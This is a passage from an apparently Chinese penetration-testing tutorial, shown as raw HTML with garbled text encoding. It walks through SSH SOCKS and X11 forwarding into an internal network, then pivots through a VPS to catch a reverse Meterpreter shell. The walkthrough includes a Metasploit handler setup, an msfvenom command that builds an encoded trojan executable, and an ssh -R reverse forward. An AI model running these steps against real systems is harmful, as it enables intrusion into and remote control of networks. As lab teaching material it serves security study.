&lt;p&gt;å®è·µä¸Šå°±æ˜¯å»ºç«‹SOCKS 4/5çš„ä»£ç†é€šé“ï¼Œæˆ‘ä»¬åœ¨VPSä¸Šè¾“å…¥ä¸‹é¢å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh -CfNg -D 8811&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VPSç«¯å£&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; web@172.16.0.108&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;WebæœåŠ¡å™¨&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬åœ¨VPSæœåŠ¡å™¨æŸ¥çœ‹ç«¯å£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VPSã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ netstat -tunlp                                                                                                                                                                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Not all processes could be identified, non-owned process info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; will not be shown, you would have to be root to see it all.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:8811            0.0.0.0:*               LISTEN      935868/ssh          
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::8811                :::*                    LISTEN      935868/ssh      
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨kaliè‡ªå¸¦çš„&lt;strong&gt;proxychains&lt;/strong&gt;ï¼Œæˆ‘ä»¬åªéœ€è¦ç¼–è¾‘ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VPSã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ sudo vim /etc/proxychains4.conf 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨æœ€åä¸€è¡ŒåŠ å…¥å†…å®¹&lt;code&gt;socks4  127.0.0.1 8811&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[ProxyList]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# add proxy here ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# meanwile
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# defaults set to &amp;#34;tor&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;socks4  127.0.0.1 8811
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿å­˜åï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸‹é¢å‘½ä»¤å³å¯è®¿é—®åˆ°æ•°æ®åº“æœåŠ¡å™¨çš„3389ç«¯å£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VPSã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ proxychains4 remmina         
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç›´æ¥è¾“å…¥æ•°æ®åº“æœåŠ¡å™¨IPå³å¯è¿æ¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨nmapã€hydraç­‰å·¥å…·å¯¹å†…ç½‘è¿›è¡Œæ‰«æï¼Œåªéœ€è¦åœ¨å‰é¢åŠ ä¸Šproxychains4å³å¯ã€‚&lt;/p&gt;
&lt;h3 id=&#34;4xåè®®è½¬å‘&#34;&gt;4ã€Xåè®®è½¬å‘&lt;/h3&gt;
&lt;p&gt;è¿œç¨‹ç™»é™† Linux GUI è¿è¡Œå›¾å½¢åŒ–ç•Œé¢å·¥å…·ï¼Œç±»ä¼¼äºVNCå’ŒX windowsã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¦ä¾§ä¸ºæ”»å‡»è€…çš„VPSï¼Œä¸­é—´æ˜¯ä¸€å°é˜²ç«å¢™ï¼Œå³ä¾§åˆ™æ˜¯ä¸€ä¸ªå°å‹çš„å†…ç½‘ï¼›å¤–éƒ¨çš„VPSèƒ½è®¿é—®å†…ç½‘çš„WebæœåŠ¡å™¨ï¼Œä½†ä¸èƒ½è®¿é—®æ•°æ®åº“æœåŠ¡å™¨ï¼Œæ•°æ®åº“å’ŒWebæœåŠ¡å™¨èƒ½äº’ç›¸è®¿é—®ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦åšçš„ç›®æ ‡æ˜¯ï¼š&lt;strong&gt;ä»¥WebæœåŠ¡å™¨ä½œä¸ºè·³æ¿å»ºç«‹éš§é“ï¼Œè®¿é—®å†…ç½‘ä¸­æœåŠ¡å™¨&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨VPSä¸Šè¾“å…¥ä¸‹é¢å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh -X web@172.16.0.108&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;WebæœåŠ¡å™¨&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥å‘ç°ç»ˆç«¯å·²ç»å˜æˆäº†webæœåŠ¡å™¨çš„ç»ˆç«¯ç•Œé¢ï¼Œæˆ‘ä»¬åœ¨å½“å‰çš„ç»ˆç«¯è¾“å…¥firefoxã€remminaå°±æ˜¯æ‰“å¼€webæœåŠ¡å™¨ä¸Šçš„è½¯ä»¶ï¼Œç›¸å½“äºVPSä¸Šå®ç°å›¾å½¢åŒ–æ“ä½œï¼ŒæŸ¥è¯¢ç«¯å£ä¸¤è¾¹éƒ½ç›‘å¬äº†6010ç«¯å£ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å›¾ä¸­çš„oscpæ˜¯VPSï¼Œkaliæ˜¯WebæœåŠ¡å™¨ï¼Œ106æ˜¯æ•°æ®åº“æœåŠ¡å™¨&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;0x02-å®æˆ˜&#34;&gt;0x02 å®æˆ˜&lt;/h2&gt;
&lt;p&gt;å®éªŒç¯å¢ƒå¦‚å›¾ï¼Œä¸‹é¢çš„ç¯å¢ƒç›¸å½“äºæˆ‘ä»¬æ‹¿åˆ°äº†webæœåŠ¡å™¨çš„webshellï¼Œä½†æ˜¯æ˜¯å†…ç½‘æœºå™¨ï¼ŒVPSä¸èƒ½ç›´æ¥è®¿é—®åˆ°WebæœåŠ¡å™¨ï¼Œè€Œä¸”VPSä¸Šæ²¡æœ‰Msfï¼ŒVPSä¹Ÿä¸èƒ½ç›´æ¥è®¿é—®æœ¬åœ°Kali Linuxï¼Œä½†webæœåŠ¡å™¨å’Œæœ¬åœ°Kali Linuxå¯ä»¥è®¿é—®åˆ°VPSï¼Œè¿™ä¸ªæ—¶å€™è¦ç”¨åˆ°Msfæˆ‘ä»¬éœ€è¦ä½¿ç”¨SSHåè®®è¿›è¡Œç«¯å£è½¬å‘ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨reGeogæ¥åšä»£ç†ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦åšçš„ç›®æ ‡æ˜¯ï¼š&lt;strong&gt;åˆ©ç”¨VPSä½œä¸ºä¸­è½¬ï¼Œæœ¬åœ°Kali Linuxåˆ©ç”¨Msfæ§åˆ¶å†…ç½‘ä¸­çš„WebæœåŠ¡å™¨&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;åœ¨å…¬ç½‘çš„VPSéœ€è¦ä¿®æ”¹ä¸€ä¸‹sshçš„é…ç½®æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo vim /etc/ssh/sshd_config
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŠŠä»¥ä¸‹ä¸‰é¡¹å¼€å¯å¹¶ä¿®æ”¹ä¸ºyesï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; AllowTcpForwarding yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; GatewayPorts yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; TCPKeepAlive yes
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…ˆåœ¨æœ¬åœ°çš„Kali Linuxä¸Šè¿›è¡Œå¯åŠ¨Msfç›‘å¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; use exploit/multi/handler
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp_rc4_dns 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lhost 172.16.0.107
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name  Current Setting  Required  Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----  ---------------  --------  -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/meterpreter/reverse_tcp_rc4_dns&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name         Current Setting  Required  Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----         ---------------  --------  -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   EXITFUNC     process          yes       Exit technique &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Accepted: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, seh, thread, process, none&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LHOST        172.16.0.107     yes       The DNS hostname to connect back to
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LPORT        &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt;               yes       The listen port
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   RC4PASSWORD  msf              yes       Password to derive RC4 key from
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Exploit target:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Id  Name
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   --  ----
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Wildcard Target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªæœ¨é©¬,lhostå¡«å†™VPSçš„IPï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfvenom --platform Windows -p windows/meterpreter/reverse_tcp_rc4_dns lhost=172.16.0.108 lport=443 rc4password=msf -e x86/shikata_ga_nai -b &amp;#39;\x00&amp;#39; -i 5 -f exe -o dns_rc4.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‹ä¸€æ­¥å°±åœ¨æœ¬åœ°Kali Linuxä¸Šæ‰§è¡Œsshè½¬å‘ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€(Kaliã‰¿Kali)-[~]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ ssh -C -f -N -g -R 443(VPSç«¯å£):172.16.0.107(æœ¬åœ°Kali):53(Kaliç›‘å¬ç«¯å£) VPS@172.16.0.108 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæŸ¥çœ‹æœ¬åœ°Kaliçš„ç«¯å£çŠ¶æ€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ netstat -tunlp                                                                                                                                                                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Not all processes could be identified, non-owned process info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; will not be shown, you would have to be root to see it all.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 172.16.0.107:53         0.0.0.0:*               LISTEN      - 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      - 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŸ¥çœ‹VPSçš„ç«¯å£çŠ¶æ€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”€â”€(vpsã‰¿vps)-[~]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ netstat -tunlp                                                                                                                                                                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(Not all processes could be identified, non-owned process info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; will not be shown, you would have to be root to see it all.)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Active Internet connections (only servers)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        0      0 0 0.0.0.0:443           0.0.0.0:*               LISTEN      - 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp6       0      0 :::22                   :::*                    LISTEN      - 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp6       0      0 :::443                  :::*                    LISTEN      - 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åæˆ‘ä»¬æŠŠç”Ÿæˆçš„æœ¨é©¬&lt;code&gt;dns_rc4.exe&lt;/code&gt;æ”¾åœ¨WebæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œå°±å¯ä»¥çœ‹åˆ°msfåå¼¹å›æ¥ä¸€ä¸ªshellï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 172.16.0.107:53 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending stage &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;175178&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to 172.16.0.107
